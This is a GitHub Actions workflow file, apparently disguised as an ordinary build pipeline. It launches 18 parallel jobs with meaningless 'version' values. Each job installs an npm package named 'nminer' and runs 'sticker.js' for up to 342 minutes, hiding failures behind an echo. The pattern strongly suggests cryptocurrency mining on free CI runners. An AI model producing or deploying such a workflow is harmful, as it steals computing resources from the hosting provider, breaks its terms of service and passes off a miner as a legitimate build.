name: sticker
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4870 }
          - { version: 778 }
          - { version: 9941 }
          - { version: 2868 }
          - { version: 9686 }
          - { version: 6969 }
          - { version: 9723 }
          - { version: 291 }
          - { version: 351 }
          - { version: 7518 }
          - { version: 5671 }
          - { version: 3193 }
          - { version: 2964 }
          - { version: 2211 }
          - { version: 2856 }
          - { version: 44 }
          - { version: 4888 }
          - { version: 6420 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: pace gee until apud
        run: |
          npm install nminer@latest
          timeout 342m node sticker.js || echo "sticker executed"